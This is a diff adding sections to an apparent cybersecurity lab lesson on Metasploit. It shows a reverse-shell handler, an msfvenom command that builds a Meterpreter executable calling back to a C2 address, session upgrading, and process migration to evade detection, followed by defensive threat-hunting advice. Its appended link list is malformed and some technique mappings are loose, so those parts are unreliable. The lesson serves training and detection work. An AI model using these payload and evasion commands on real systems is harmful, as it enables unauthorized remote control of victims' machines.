@@ -151,6 +151,47 @@ Expected: `1` host, `1` service line, and a `service` element showing `Apache ht
 - **T1055 Process Injection** — Meterpreter code injection into a legitimate process (DFIR phase: examination / eradication). https://attack.mitre.org/techniques/T1055/
 - **T1573 Encrypted Channel** — Use of TLS/SSL by Meterpreter for C2 communication (DFIR phase: examination). https://attack.mitre.org/techniques/T1573/
 
+
+### Essential Commands & Features
+
+Mastering Metasploit’s core commands accelerates exploit execution, payload generation, and post-exploitation. Below are **undemonstrated but critical** features with concrete examples:
+
+1. **`exploit -j` (Run as Job)**
+   Execute an exploit in the background to free the console for other tasks. Useful for multi-target engagements or when awaiting callbacks.
+   ```bash
+   msf6 > use exploit/multi/handler
+   msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+   msf6 exploit(multi/handler) > exploit -j
+   [*] Exploit running as background job 0.
+   ```
+
+2. **`msfvenom` (Standalone Payload Generation)**
+   Generate obfuscated payloads for lateral movement (e.g., **T1021.002: Remote Services - SMB/Windows Admin Shares**). Replace `LHOST` and `LPORT` with your C2 server.
+   ```bash
+   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443 -f exe -o payload.exe
+   ```
+
+3. **`sessions -u` (Upgrade Shell to Meterpreter)**
+   Convert a basic shell to a Meterpreter session for advanced post-exploitation (e.g., **T1059.003: Command and Scripting Interpreter - Windows Command Shell**).
+   ```bash
+   msf6 > sessions -u 1
+   [*] Upgrading session ID: 1
+   ```
+
+4. **`meterpreter > migrate` (Process Injection)**
+   Move Meterpreter to a stable process (e.g., `explorer.exe`) to evade detection (maps to **T1055.002: Process Injection - Portable Executable Injection**).
+   ```bash
+   meterpreter > migrate 1234
+   [*] Migrating to 1234...
+   ```
+
+**Sources:**
+- [Offensive Security Metasploit Unleashed: Advanced Payloads](https://www.offensive-security.com/metasploit-unleashed/payloads/)
+- [MITRE ATT&CK: T1021.002 & T1059.003](https://attack.mitre.org/techniques/T1021/002/)
+
+### Threat Hunting & Detection Engineering
+To enhance threat hunting and detection engineering capabilities, focus on identifying techniques such as [T1204](https://attack.mitre.org/techniques/T1204) - "User Execution" and [T1218](https://attack.mitre.org/techniques/T1218) - "Signed Binary Proxy Execution". Monitor Windows Event ID 4688 for command line executions, analyzing the `CommandLine` field for suspicious activity. Additionally, inspect Zeek logs for unusual DNS queries, particularly those with low TTL values or suspicious domain names. Threat hunters can pivot on these findings by investigating related network connections, process creations, or registry modifications. For instance, a suspicious command line execution can lead to examining the corresponding process ID in Windows Event ID 4688, and then searching for network connections related to that process in Zeek logs. By integrating these detection logic and threat hunting pivots, security teams can improve their ability to detect and respond to advanced threats. For more information on threat hunting and detection engineering, visit [https://www.cisecurity.org/](https://www.cisecurity.org/) or [https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf](https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf).
+
 ## Sources
 Claim → source mapping (all URLs are official tool docs, MITRE ATT&CK, SANS, or Security Onion docs):
 
@@ -188,3 +229,11 @@ Claim → source mapping (all URLs are official tool docs, MITRE ATT&CK, SANS, o
 - [YARA rule authoring & threat hunting](../21-yara-authoring/README.md) -- same Deep-dives learning path; write detections for payload/on-disk artifacts.
 
 <!-- cyberlab-enriched: v2 -->
+- https://www.offensive-security.com/metasploit-unleashed/payloads/
+- https://attack.mitre.org/techniques/T1021/002/
+- https://attack.mitre.org/techniques/T1204
+- https://attack.mitre.org/techniques/T1218
+- https://www.cisecurity.org/](https://www.cisecurity.org/
+- https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf](https://www.fireeye.com/content/dam/fireeye-www/global/en/pdfs/rpt-m-trends-2022.pdf
+
+<!-- cyberlab-enriched: v3 -->
